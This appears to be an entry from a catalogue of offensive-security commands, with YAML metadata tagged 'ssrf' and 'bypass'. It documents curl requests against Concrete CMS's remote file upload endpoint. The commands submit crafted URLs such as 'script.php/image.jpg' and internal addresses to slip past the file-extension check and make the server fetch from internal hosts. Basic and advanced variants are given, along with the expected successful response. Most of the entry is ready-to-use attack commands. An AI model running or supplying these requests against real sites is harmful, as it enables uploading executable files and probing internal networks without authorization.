---
id: c-test-upload-bypass
data: >-
  curl -X POST -F "remote_url=http://192.168.1.148/index.php/test.png"
  http://concrete-cms.example.com/dashboard/files/upload_remote
tags:
  - ssrf
  - bypass
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:02.518Z'
verified: false
validated: true
submitted: true
---
# test-upload-bypass-curl

## Command

```bash
curl -X POST -F "remote_url=http://192.168.1.148/index.php/test.png" http://concrete-cms.example.com/dashboard/files/upload_remote
```

## Description

This command tests the file extension bypass in Concrete CMS by submitting a crafted URL via POST to the remote upload endpoint, simulating the UI form submission.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method for form submission | Yes |
| `-F "remote_url=..."` | Form field with the bypass URL | Yes |
| `http://concrete-cms.example.com/...` | Target CMS upload endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -F "remote_url=http://example.com/script.php/image.jpg" http://cms/upload
```

### Advanced Usage

```bash
curl -X POST -F "remote_url=http://internal/index.php/test.png" -F "other_field=value" http://cms/upload_remote -v
```

## Expected Output

HTTP 200 response with JSON or HTML indicating successful upload, e.g., {"status":"success","file_id":123}. No validation errors.

## Related

- [[Related Procedure]]
